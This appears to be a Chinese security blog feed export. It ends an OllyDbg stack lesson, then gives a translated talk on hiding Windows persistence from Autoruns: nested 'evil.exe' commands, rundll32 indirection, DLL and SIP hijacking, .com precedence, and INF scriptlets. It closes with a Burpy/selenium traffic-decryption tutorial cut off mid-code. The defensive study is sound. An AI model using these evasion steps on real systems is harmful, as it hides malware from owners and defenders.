<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="/images/58fe7636b3a2ab76b98f4c81d28b7f29b88f2403.png" alt="41.png"><br>Ollydbg 将是我们以后用到的主要软件之一。请各位同学自行下载， 并搜索资料熟悉一下。<br>我们来认识下上图的信息：</p>
<ol>
<li><p>左上角的窗口中，我们可以编写汇编指令。右上角的窗口显示了各个寄存器的状态和值。左下角是二进制以及十六进制的数据。右下角是堆栈的情况。</p>
</li>
<li><p>如果想让OD从你指定的位置开始执行，请<code>右击该行</code>，并选择<code>在此处新建EIP</code>。按<code>F7</code>键单步执行四次。</p>
</li>
<li><p>执行完上述四条XOR指令之后，我们将EAX／EBX／ECX／EDX成功清零。</p>
</li>
<li><p>EIP的值，为当前高亮的代码行，表示即将要执行的语句。</p>
</li>
<li><p>通过堆栈窗口我们可以看到：</p>
</li>
<li><p>堆栈的结构是<code>从下往上减少</code>；</p>
</li>
<li><p>栈顶的位置是<code>0021f7bc</code>；</p>
</li>
<li><p>两个相邻的栈地址相差<code>4h</code>。</p>
</li>
</ol>
<h4 id="POP／PUSH操作"><a href="#POP／PUSH操作" class="headerlink" title="POP／PUSH操作"></a>POP／PUSH操作</h4><ul>
<li><p><code>PUSH EAX</code>：<br><img src="/images/e4ea906988dfd5062033ba94d5306b1e86a1dfc8.png" alt="42.png"><br>在我们执行了push操作之后，栈顶变为了<code>0021f7b8</code>，而这个地址对应的数据为<code>00000000</code>(h)。</p>
</li>
<li><p><code>MOV ECX,1234h</code>:<br><img src="/images/123fdfdfdc0ffab9bf97cc2e5a5b74e6d4c753f3.png" alt="43.png"></p>
</li>
<li><p><code>POP ECX</code>:<br><img src="/images/0c91b3fa3631eea7adc756ab63e81e7ae24e2fde.png" alt="44.png"><br>注意ECX值的变化。通过mov指令，我们给ECX传入了0x1234h，但是通过pop指令，我们将栈顶的EAX的值，弹出了堆栈，并且传递给了ECX，同时ESP栈顶<code>+4</code>变为了push eax之前的地址。</p>
</li>
</ul>
<p>请各位同学自行实验并理解堆栈的使用和操作。</p>
<h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><p>设EAX为00001111h，EBX为00002222h，请交换两个寄存器的值。<br><strong>要求：不允许使用<code>xchg</code>和<code>mov</code>指令</strong></p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>透过Autoruns看持久化绕过姿势的分享</title>
    <url>/pentest/%E9%80%8F%E8%BF%87Autoruns%E7%9C%8B%E6%8C%81%E4%B9%85%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%88%86%E4%BA%AB.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/163632.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>在网络攻防的对抗中，对于攻击者而言，对目标系统的权限维持（也称持久化）非常重要；对于防御者来说，发现网络中的这些点也非常重要。</p>
<p>本文主要内容来自Kyle和Chris在DerbyCon 7中的分享，主要展示了一些半公开和尚未公开的技术，用于绕过Autoruns这个最常用的持久化枚举检查工具。</p>
<h2 id="哪儿的问题？"><a href="#哪儿的问题？" class="headerlink" title="哪儿的问题？"></a>哪儿的问题？</h2><p>Windows系统可能有成百上千种方法去加载&#x2F;调用一些库或可执行程序，有时是在启动时，有时是在用户登陆时，也有时是当一个程序执行时。我们称这些点为<code>ASEPs</code>（Auto Start Entry Points），例如Skype，Skype一般会设置成“开机启动”，这样可以省去每次开机都要打开Skype的麻烦，Skype会告诉Windows系统，我是一个合法的程序，请每次开机的时候启动我。但攻击者也会从中受益，因为攻击者可以把恶意代码设置为一个服务，并设置为“开机启动”。</p>
<p>作为防御方，我们可能会想到一些自动检查这些ASEPs的工具，而且我们有MSDN可以查。但是有很多东西是无法MSDN文档中找到的，收集这些自启动点也是非常困难的。另外，攻击者一般会使用一些间接的方法来扰乱安全排查软件的视线。</p>
<h2 id="Sysinternals-Autoruns"><a href="#Sysinternals-Autoruns" class="headerlink" title="Sysinternals Autoruns"></a>Sysinternals Autoruns</h2><p>Sysinternals Autoruns 是一款 由Mark Russinovich开发和维护的软件，它可以检查到的ASEP也是最多的，如：</p>
<ul>
<li>Run Keys，运行键</li>
<li>Services</li>
<li>Schedualed Tasks</li>
<li>Providers</li>
<li>Drivers</li>
<li>WMI</li>
</ul>
<p>这款工具不是专门为安全人员设计开发的，它能简单枚举出计算机中的<code>自启动</code>的位置，但是需要用户去确定这个自启动程序的合法性。即使如此，它也常常被当作一个安全工具来使用，因为作者还集成了VirusTotal来检测自启动位置上的恶意软件，所以恶意软件的制作者们也一直在寻找可以躲过Autoruns检查的方法。</p>
<h2 id="4个半公开的绕过方法"><a href="#4个半公开的绕过方法" class="headerlink" title="4个半公开的绕过方法"></a>4个半公开的绕过方法</h2><h3 id="Nested-Commands-命令嵌套"><a href="#Nested-Commands-命令嵌套" class="headerlink" title="Nested Commands (命令嵌套)"></a>Nested Commands (命令嵌套)</h3><p><code>Nested Commands</code> 是一种将多条命令集合成一条命令的机制。<br>之所以要这样做，是因为我们不想让Autoruns软件检测出我们运行的恶意代码，这些命令会让Autoruns或防御者认为我们的命令是在运行一个具有合法签名的程序。这是一个绕过的基础知识。随着安全人员和攻击者越来越多的关注这些绕过方式，相信在将来还会出现更加复杂的方式。</p>
<h4 id="怎么隐藏"><a href="#怎么隐藏" class="headerlink" title="怎么隐藏"></a>怎么隐藏</h4><p>当我们说隐藏的时候，我们究竟指的是什么呢？<br>来看下面的图：<br><img src="/images/b04cbd9621031c9a7dae3255c2c2717e6ddf5754.jpg" alt="15.png.jpg"></p>
<p>这是一张Autoruns的截图。Autoruns可以告诉机器上所有的<code>自启动项</code>，注册表中哪些是开机启动的，哪些是登陆时启动的，哪些是作为服务启动的，甚至还有哪些是作为驱动来启动的，以及一些计划任务和Winsock Prividers。<br>从图中可以看出，在我们没有使用隐藏技术的时候，当我们开启了Autoruns的过滤功能后，我们安装的自启动项就暴露在眼前了，包括我们启动项所在位置，执行的命令以及加载的DLL信息。</p>
<p>我们要做的是利用Autoruns的两个功能，这两个功能本来是要帮助安全人员在检查自启动程序时缩小排查范围的，但是可以利用这两个功能来达到隐藏的目的：</p>
<ul>
<li>隐藏Microsoft条目：这个功能可以把具有Microsoft签名的条目隐藏。</li>
<li>隐藏Windows条目：这个功能可以把具有Windows证书签名的条目隐藏。</li>
</ul>
<p>这两个功能可以帮助安全人员把注意力集中在第三方安装的自启动项中，一般情况下，这些启动项有比较大的概率是恶意的。</p>
<p>在介绍隐藏技术之前，首先来了解一下基本的背景知识：</p>
<ul>
<li><p>Process Exit Codes<br> 每个运行的进程&#x2F;程序都会有一个返回码（Process Exit Code），根据这个返回码可以判断程序的运行结果是成功或失败。如果返回码是<code>0</code>，则表示成功；若为返回码为<code>非0</code>的数值，则表示失败。</p>
</li>
<li><p>逻辑操作符<br>逻辑操作符的作用是根据其他程序的失败或成功来执行命令的批处理语法。<br>例如：<code>foo.exe &amp;&amp; bar.exe</code>。<br>在批处理脚本中，我们有如下三种操作符可用：</p>
<ul>
<li><code>&amp; [block]</code>：执行完前一个命令后，立刻执行后面的命令，不管前面的命令是否成功执行。</li>
<li><code>&amp;&amp; [if success]</code>：当且仅当前面的命令执行成功，才执行后面的命令。</li>
<li><code>!! [if not success]</code>：当且仅当前面的命令执行失败，才执行后面的命令。</li>
</ul>
</li>
</ul>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
<li>选一个合法的自启动项：<br>比如 ：<code>C:\Windows\system32\VBoxTray.exe</code></li>
<li>将命令修改为如下格式：<br><code>cmd.exe /c start C:\Windows\system32\VBoxTray.exe &amp; evil.exe</code></li>
</ol>
<p>通过这样设置以后，程序启动的流程就变成了如下的样子：<br><img src="/images/e7b89a25c0d47f771edcf4b3140c3640ce0f70d2.png" alt="19.png"></p>
<p><code>cmd.exe</code>会在<code>VBoxTray.exe</code>执行完成后，马上启动另一个进程执行我们的<code>evil.exe</code>。相当于我们用一条命令运行了两个程序。值得注意的是，我们这里用的是<code>&amp;</code>而不是<code>&amp;&amp;</code>，因为VBoxTray不会退出。</p>
<p>Autoruns会检测到什么结果呢？看下图：</p>
<p><img src="/images/81d0e4879cdaac7acc3d37d2f41d2368da20ac27.png" alt="20.png"></p>
<p>在版本<code>&lt;13.80</code>的Autoruns里面，我们修改的启动项会以VBoxTray名字显示，而且图标也是正常的，发布者显示来自Oracle，包括执行的文件（<code>Image Path</code>）都显示正常，唯一能发现我们更改的地方是详细信息里面。作为防御者，在看到正常的启动项时，估计很少有人看详细信息。<br>这样，我们就达到了某种程度的成功。</p>
<p>但是这样就安全了吗？呵呵…</p>
<p><img src="/images/8f3be5600201745c519ea831a8f6a4ba7430e02c.png" alt="22.png"></p>
<p>我们看到，在版本<code>&gt;=13.80</code>的Autoruns里面，执行文件就显示成了<code>cmd.exe</code>，我们显然已经不在VBoxTray的保护下面了。</p>
<p>这样的变化提示防御者，单纯使用Autoruns并不能够帮你排除所有的恶意启动项，我们还需要加入自己的分析。</p>
<h3 id="Shell32-dll-Indirection-间接调用Shell32-dll"><a href="#Shell32-dll-Indirection-间接调用Shell32-dll" class="headerlink" title="Shell32.dll Indirection (间接调用Shell32.dll)"></a>Shell32.dll Indirection (间接调用Shell32.dll)</h3><p>简单的说，这个技术是结合<code>rundll32.dll</code>和<code>shell32.dll</code>来执行程序，以便能够欺骗Autoruns。</p>
<p>Shell32.dll是一个Microsoft签名的程序，它提供了<code>explorer.exe</code>的功能，比如”找开“，”运行程序“等，我们可以使用IDA打开这个DLL然后查看导出表。<br>对攻击者而言，这个DLL还有非常多的有用的函数可用，可以用来加载别的DLL文件或者执行一个程序，比如<code>ShellExec_RunDLL</code>，<code>Control_RunDLL</code>，<code>DllInstall</code>等等。</p>
<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><p>我们通过如下的方法，可以启动一个程序：<br><code>rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe</code></p>
<p>这条语种的执行流程如下：</p>
<p><img src="/images/8ac5f71f3321f416ec77559df608503dc47bcb5d.png" alt="30.png"></p>
<p>如果我们通过这种方式来设置我们的启动项的话，在Autoruns里面会是什么样子呢？</p>
<ul>
<li>Autoruns &lt; 13.80 不启用MS过滤<br><img src="/images/ba6ebb93b587c5f6354be622d62f02cc4327f311.png" alt="31.png"></li>
<li>Autoruns &lt; 13.80 启用MS过滤<br><img src="/images/a85ceb870677de368dd79721dc1bd9248a7cc00a.png" alt="32.png"></li>
</ul>
<p>我们看到，在不启用过滤时，Autoruns将其识别为<code>shell32.dll</code>，但是，当防御者打开”过滤Microsoft签名的程序“时，被安装在机器上的自启动项便不见了。</p>
<ul>
<li>Autoruns &gt;&#x3D; 13.80 启用MS过滤<br><img src="/images/bfe2902fc023ca3ecc48508da51e2e470d1c8ee9.png" alt="33.png"></li>
</ul>
<p>但是，在高版本的Autoruns中，即使我们启用了过滤，我们的启动项依然会被显示出来，即<code>rundll32.exe</code>。<br>一些正常的程序也会使用rundll32.exe来进行自启动，比如打印机驱动。所以即使我们的启动项被显示出来了，但是这里还是需要一些安全知识背景才能确定这个启动项是不是恶意的。</p>
<h3 id="DLL-Hijacking-DLL劫持"><a href="#DLL-Hijacking-DLL劫持" class="headerlink" title="DLL Hijacking (DLL劫持)"></a>DLL Hijacking (DLL劫持)</h3><p><code>DLL Hijacking</code>，或<code>DLL劫持</code>，是一种利用Windows加载动态链接库时的<code>Search Order</code>（搜索顺序）来加载&#x2F;执行恶意代码的技术手段。<br>在Autoruns中，如果利用这种技术手段设置启动项的话，Autoruns只会显示可执行程序的信息，它并不关心这个程序加载的是哪个DLL。所以，Autoruns在遇到DLL劫持的技术时，是帮不了防御者的忙的。</p>
<p>那什么是搜索顺序呢？</p>
<ul>
<li>Search Order:<br> 程序通过<code>LoadLibrary()</code>函数来请求Windows系统去加载一个DLL到内存中，而Windows会遵循一个已定义好的搜索方法去查找被请求的DLL，具体顺序如下：<ul>
<li>程序运行目录</li>
<li>系统system32目录</li>
<li>系统system目录</li>
<li>Windows目录（C:\Windows）</li>
<li>当前目录</li>
<li>PATH环境变量中的目录列表</li>
</ul>
</li>
</ul>
<p>Windows会根据搜索顺序一个一个的查找被请求加载的DLL，只要找到一个DLL的名字与被请求的DLL名字一致，Windows就会停止继续查找，并去加载它，不管它是不是恶意的DLL。</p>
<p>所以我们只需将恶意的DLL一个合适的目录中，并且保证这个目录在搜索顺序中比放置合法DLL的目录靠上，我们的恶意DLL就会被加载。</p>
<h4 id="木马Dridex的做法"><a href="#木马Dridex的做法" class="headerlink" title="木马Dridex的做法"></a>木马Dridex的做法</h4><p>木马Dridex就是一个使用一种叫作<code>AtomBombing</code>的技术对DLL进行劫持的变种，而使用Autoruns检查的时候，Autoruns只会将可执行程序显示出来。</p>
<ol>
<li>Dridex木马会利用DLL劫持技术将自己隐藏在一个有合法签名的可执行程序下面，它获取可执行程序的哈希值，直到找到一个符合的，然后将这个程序复制到用户目录下的<code>AppData\Roaming</code>文件夹中。</li>
<li>从程序的导入表中随机选取一个DLL，并且复制到包含正常可执行程序的目录中，将恶意代码注入到DLL中，让恶意代码在DLL加载时执行。</li>
<li>在注册表中新建一个键，并指向合法的可执行程序，并且设置为当用户登陆时运行。</li>
</ol>
<p>用Autoruns来检查感染Dridex木马的机器时，是这样的：<br><img src="/images/3f9e4c561426465f7f3ec5f03469f83630fa5bd0.jpg" alt="44.jpg"></p>
<p>可以看到，Autoruns只识别出了合法的程序，并且这个启动项并没有什么异常！</p>
<h3 id="SyncAppvPublishingService"><a href="#SyncAppvPublishingService" class="headerlink" title="SyncAppvPublishingService"></a>SyncAppvPublishingService</h3><p><code>SyncAppvPublishingService</code>是PowerShell的提供<code>App Virtualization Publishing</code>功能的一个命令。这个功能是做什么的，可自行百度，但不懂也没关系。<br>有意思的是，这个命令自带了2个VBS文件和1个EXE文件。这个是<code>helpers</code>，可以帮助我们在无需PowerShell命令行中执行PowerShell命令。比如我们想从命令行或一个脚本中来运行PowerShell命令。它就是将获取我们在命令行中的参数进行格式化，并将其传递给PowerShell模块来执行。</p>
<p><img src="/images/c51510460c04aa22a8f4b715e72f0d60c4736051.jpg" alt="48.jpg"><br><img src="/images/6f909192e1a17c737f6f8a49c7fbedc5daadc3bd.jpg" alt="49.jpg"><br><img src="/images/6325ec5e00357467719c704297c7f63392d36424.jpg" alt="50.jpg"></p>
<p>如图所示，它用<code>g_cmdArgs</code>来接收命令行参数，然后传给<code>syncCmd</code>进行<code>简单的拼接</code>，然后调用PowerShell模块执行。所以这里就有一个<code>命令注入</code>的漏洞。<code>SyncAppvPublishingService.exe</code>与这个helper是一样的漏洞。</p>
<h4 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h4><p>我们可以通过如下方法启动一个计算器，执行流程如下：<br><img src="/images/56e2e9c7aa112acff1cd235033234f4ee333564f.png" alt="52.png"></p>
<p>Autoruns的检测结果：<br><img src="/images/2b3762499a50b9dfd8c6353b2fe74c7c645c5a28.png" alt="53.png"></p>
<p>可以看到，我们的启动项变为了Microsoft签名的，所以当防御者打开过滤的时候，我们的启动项就会被隐藏起来。</p>
<h2 id="4个未公开的绕过方法"><a href="#4个未公开的绕过方法" class="headerlink" title="4个未公开的绕过方法"></a>4个未公开的绕过方法</h2><h3 id="Service-DLL-Bug"><a href="#Service-DLL-Bug" class="headerlink" title="Service DLL Bug"></a>Service DLL Bug</h3><p>首先认识一下两种<code>Service</code>：<code>Standalone Service</code>和<code>sss service</code></p>
<h4 id="Standalone-Service"><a href="#Standalone-Service" class="headerlink" title="Standalone Service"></a>Standalone Service</h4><p>iPod Service 是随iTunes安装的Service类型的自启动项，用来管理硬件的一个Service，当它启动时，会运行一个自己的进程。当系统启动时，会调用<code>iPodService.exe</code>。这就是一个典型的Standalone Service的运行方式。来看下这样的Service在注册表中的样子：</p>
<p><img src="/images/cdf35c17b878ba252058a6149bd9f4fed6be1726.png" alt="56.png"></p>
<p>在Autoruns中的，这个Service是一个由Apple Inc签名的合法启动项：</p>
<p><img src="/images/672ea6377b67a43f094af08f94be39f70d4aa8d2.png" alt="57.png"></p>
<h4 id="Shared-Service"><a href="#Shared-Service" class="headerlink" title="Shared Service"></a>Shared Service</h4><p><code>DcomLaunch</code>是Shared Service的一个很好的例子。它是微软自带的一个Service启动项，启动的是非常常见的<code>svchost.exe</code>程序，当它启动时，它会加载<code>rpcss.dll</code>。<br>在注册表中是这样的：<br><img src="/images/c3b07ef2192663de1a344a849a19f2d885432934.png" alt="59.png"></p>
<p>对于绕过非常重要的键是<code>Parameters</code>键，它用来指定它当启动时要加载的DLL文件，这是就是这个<code>rpcss.dll</code>，如下图：<br><img src="/images/3e6eb2fca796f83907d0118dfff5ea6d4accb54b.png" alt="60.png"></p>
<p>在Autoruns里面的检测结果是一个Microsoft签名的Service：<br><img src="/images/5f6ee0bd28bfe692afdae8b320bb62c5b85f8023.png" alt="61.png"></p>
<p>如果我们的iPod Service里面手工添加一个<code>Parameters</code>键，会是什么样呢？<br><img src="/images/f887c63b4e68017b949e4ef993022450a6cb7bba.png" alt="63.png"></p>
<p><img src="/images/ee48d7628ff12bad42cb3611297f34141dda16e8.png" alt="64.png"></p>
<p>当我们进行如上修改后，在Autoruns中，会被显示为一个Microsoft签名的合法启动项。</p>
<h4 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h4><p>经过上面的演示，估计大家都知道如何隐藏自己的启动项了。<br>添加一个启动项，类型为Standalone Service，然后指定启动时运行的程序。<br><img src="/images/575964ee141f50ed3f9c5ecb948991a8345a80f1.png" alt="65.png"></p>
<p>然后新建一个<code>Parameters</code>键，然后随便挑一个合法的微软DLL，写进去。<br><img src="/images/fe7dd74fef563c568aa1ad6a9229c57cf1cb3397.png" alt="66.png"></p>
<p>在Autoruns中就会被当作一个Microsoft签名的合法启动项了：<br><img src="/images/e2b987d9ee0bd5d4664cab910bde40aeb69355e6.png" alt="67.png"></p>
<h3 id="Extension-Search-Order-Bug-扩展名的搜索顺序利用漏洞"><a href="#Extension-Search-Order-Bug-扩展名的搜索顺序利用漏洞" class="headerlink" title="Extension Search Order Bug (扩展名的搜索顺序利用漏洞)"></a>Extension Search Order Bug (扩展名的搜索顺序利用漏洞)</h3><p><code>搜索路径</code>这里不再展开，直奔主题：比如我们要运行计算器，一般我们会输入<code>calc.exe</code>，这里程序会去<code>搜索路径</code>中去找这个程序。但是如果我们只输入<code>calc</code>，也就是不带<code>.exe</code>后缀，会好发生什么呢？<br><img src="/images/cd271bfd0c86ddef476576ea38b16dd4d1b930cc.png" alt="73.png"></p>
<p>为什么这样呢？<br><img src="/images/f6cc31f555d87373ae0ad783a76795bfea598db3.png" alt="74.png"></p>
<p>当我们不指定扩展名时，Windows会根据默认的扩展名的搜索顺序在搜索目录中进行查找，但不幸的是，它会选查找<code>.com</code>扩展的文件，然后才是<code>.exe</code>扩展的文件。</p>
<h4 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h4><p>找一个自启动的Windows签名的启动项：<br><img src="/images/23972cc01978820a3998cc08ad509d42fd38acbf.png" alt="76.png"></p>
<p>它在Autoruns检测结果如下：<br><img src="/images/1153e3ccb2151729c8cce6562915f7800ff01744.png" alt="77.png"></p>
<p>我们把注册表中的键值进行一下修改，把程序扩展名删掉：<br><img src="/images/00f76912a8a9bf02923d45fa940ea55b84e8f222.png" alt="78.png"></p>
<p>然后，将我们的恶意程序复制到相应目录下，并将扩展名改为<code>.com</code>：<br><img src="/images/4e64647f27b27ae2c73660d29ebd8ef58f0ce3f8.png" alt="79.png"></p>
<p>当机器重启时，我们的程序就会自动运行：<br><img src="/images/15fa18a95e3b6da6e4c1f16512eb57140beb430e.png" alt="80.png"></p>
<p>在Autoruns中检测，会发现它并没有什么异常，因为Autoruns并不检测扩展名，而是直接解析<code>.exe</code>文件：<br><img src="/images/bf3309ff768626d3762448f9eff7318a8d41cf56.png" alt="81.png"></p>
<h3 id="SIP-Hijacking-SIP劫持"><a href="#SIP-Hijacking-SIP劫持" class="headerlink" title="SIP Hijacking (SIP劫持)"></a>SIP Hijacking (SIP劫持)</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><a href="https://github.com/mattifestation/PoCSubjectInterfacePackage" title="PoCSubjectInterfacePackage">PoCSubjectInterfacePackage</a></p>
<h4 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h4><p><img src="/images/71b862a307a34e837353ed9c1fe853861695d909.png" alt="84.png"></p>
<p>我们将一个合法程序的电子授权证书偷过来，然后添加到自己的恶意程序中，那么在Autoruns中就会显示为Microsoft验证过的启动项：<br><img src="/images/0e1c916aa7e211ecb8674cd7d6432ea6ed0448c3.png" alt="85.png"></p>
<h3 id="INF-Scriptlets"><a href="#INF-Scriptlets" class="headerlink" title=".INF Scriptlets"></a>.INF Scriptlets</h3><p>提到这种技术的时候，我们一般会想到Casey给出的一个使用<code>regsvr32.exe</code>的例子：<br><img src="/images/4049dc545ab4b4ec6179208952d8d40aaee4f9ff.png" alt="88.png"></p>
<p>我们使用这个合法的Microsoft可执行程序来静默注册或卸载一个二进制程序或对象文件。上面这个例子中，我们告诉Windows我们想要卸载<code>scrobj.dll</code>，当卸载这个dll时，会给我们机会来提交或下载一个<code>脚本文件</code>，这个脚本文件是<code>XML</code>格式的。这使得我们能利利用一个合法的程序调用一个合法的dll去下载我们的payload。这种方法自从公开之后就变得不好用了，因为各种防护开始针对这种方法时行封堵。比如在Autoruns当中，会显示出<code>regsvr32.exe</code>：<br><img src="/images/236eb1901c2ba4522f612633abbd773642e157e4.png" alt="90.png"></p>
<p>那么我们就没有办法了吗？当然不是。</p>
<p>在MSDN中有一个<code>INF UnregisterDlls</code>命令：<br><img src="/images/da92ca6849e72614f87a597e055bd5ef6347d4df.png" alt="92.png"></p>
<p>我们新建一个<code>inf</code>文件，使用合适的程序去调用它，那么它就会跟我们上文中提到的相似，程序会像regsvr32一样，调用<code>scrobj.dll</code>去下载我们指定的<code>脚本文件</code>。如果通过社会工程学的攻击方法，可诱导用户右击并安装我们指定的程序，如下图。<br><img src="/images/ac87ae76973e41d74a49d4dee1e4f2ec153337f6.png" alt="93.png"></p>
<h4 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h4><p>利用<code>rundll32.exe</code>去调用<code>setupapi.dll</code>，然后指定我们新建的<code>inf</code>文件，就可以达到我们的目的，执行流程如下：<br><img src="/images/6de20e396914e39d2b8afaf38e9f970c2624d31c.png" alt="94.png"></p>
<p>安装完成全，Autoruns的检测结果如下：<br><img src="/images/0376ee98794134c124e4c2b3541f5d18a6a471e9.png" alt="95.png"></p>
<p>很不幸的是，被新版本的Autoruns检测出来了。</p>
<p>这里，我们的绕过方法是使用<code>InfDefaultInstall.exe</code>。这是一个本地签名的微软程序：<br><img src="/images/8d18050637916fe00df892d5fc324be65c411107.png" alt="96.png"></p>
<p>这个可执行程序一样会去加载你的inf文件，下载并执行你指定的<code>脚本文件</code>。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>持久化越来越已成为攻击者所关注的事，希望通过这篇文章的分析，能够提高防御者的视野。毕竟，攻击者的招数不止这些！</p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>高效处理H5站点流量加解密</title>
    <url>/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html</url>
    <content><![CDATA[<h1 id="高效处理H5站点流量加解密"><a href="#高效处理H5站点流量加解密" class="headerlink" title="高效处理H5站点流量加解密"></a>高效处理H5站点流量加解密</h1><p><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-15-56-18.png"></p>
<p>做项目时，如果遇到上面的流量，是不是觉得有点无从下手？</p>
<p>今儿就看下如何使用<code>Burpy</code>来高效处理流量加解密。</p>
<h2 id="Burpy"><a href="#Burpy" class="headerlink" title="Burpy"></a>Burpy</h2><p>先来地址：<code>Github: https://github.com/mr-m0nst3r/Burpy</code></p>
<p>直接在<code>Release</code>下载下来，加载到<code>BurpSuite</code>。</p>
<p>它本身的功能很简单，就是执行我们指定的python脚本，而python脚本能用来干啥，你可以百度一下（你能想到的，基本都能做到）。</p>
<p>大概的实现是这样的：</p>
<ul>
<li>启动一个RPC服务器，作为Java和Python之间的数据交换桥梁</li>
<li>解析python脚本，并新建Burpy类的一个实例</li>
<li>将脚本中的<code>一些</code>函数加载到BurpSuite右键菜单</li>
<li>当点击Burpy菜单项时，整个HTTP数据包通过RPC传给python脚本的对应函数进行处理，返回处理后的HTTP数据包，并更新BurpSuite</li>
</ul>
<h2 id="分析目标"><a href="#分析目标" class="headerlink" title="分析目标"></a>分析目标</h2><p>这是个<code>Webpack</code>之后的H5界面，前端使用VueJS编写的：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-39-51.png"></p>
<p>我们将上面的几个JS脚本文件下载到本地，使用<code>prettier</code>进行美化格式之后，用VS Code打开，然后查找<code>encrypt</code>：<br><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-06-02.png"></p>
<p>大概看了一下，<code>Wn.a.encrypt</code>是加密函数，<code>Wn.a.decrypt</code>是解密函数。</p>
<p>解密时有两个参数，K1和K2，K1就是密文，K2是通过一个计算（md5）K1变换之后与提交的K2是否相等，如果相等就进行解密，是一个解密带签名的操作。</p>
<p>加密时，将数据进行加密之后进行<code>base64</code>编码，构造K2的值，然后构造数据包。</p>
<h2 id="ModuleRaid-js"><a href="#ModuleRaid-js" class="headerlink" title="ModuleRaid.js"></a>ModuleRaid.js</h2><p>这个工具脚本的功能不详，不过提供了一个非常有用的方法：<code>findModule</code>。</p>
<p>用浏览器打开目标网站，F12打开检查，将ModuleRaid.js复制到<code>console</code>里面，回车，我们就能通过<code>window.mR</code>来使用它了。</p>
<p><img src="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86/2020-12-29-16-41-52.png"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我们已经可以从浏览器中正常加解密数据了，但是如果让我们在浏览器&#x2F;BurpSuite中间复制来粘贴去的，这活我干不了，想想都头疼。这时候就是Burpy大显身手的时候了。</p>
<p>我们不需要在python里面实现这个算法是如何实现的，不需要使用python重写加密和解密代码，只需要直接调用就好了。</p>
<p>但直接调用的时候，就像上面，是在浏览器中啊，怎么办？<code>selenium</code>～</p>
<p>我们要达到的目的是：</p>
<ul>
<li>轻轻一点，解密出来，修改数据包</li>
<li>再轻轻一点，加密，点击GO发送</li>
<li>再轻轻一点，解密，看看返回包</li>
</ul>
<p>或者更好一点：</p>
<ul>
<li>一点解密，修改数据包</li>
<li>点GO，自动加密</li>
<li>收到返回包之后自动解密出来显示在BurpSuite里</li>
</ul>
<p>第二种情况下，加密解密已经透明了。</p>
<p>值得高兴的是，这些功能，Burpy都支持。</p>
<h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>Burpy脚本的框架在Github里面有，各位自己看一下，很简单明了。<br>直接上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment"># 下载chromedriver，并指定路径</span></span><br><span class="line"><span class="comment"># 安装 selenium</span></span><br><span class="line"><span class="comment"># 下载moduleraid，并指定路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chromeExec = <span class="string">&quot;/usr/bin/chromedriver&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://xxxx.com/yyyy/zzzz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        this is called from the start of PyRo4 service, so init webdriver here</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        option = webdriver.ChromeOptions()</span><br><span class="line">        option.add_argument(<span class="string">&#x27;headless&#x27;</span>)</span><br><span class="line">        self.driver = webdriver.Chrome(executable_path=chromeExec, chrome_options=option)</span><br><span class="line">        self.driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">        self.driver.get(url)</span><br><span class="line">        self.k1 = <span 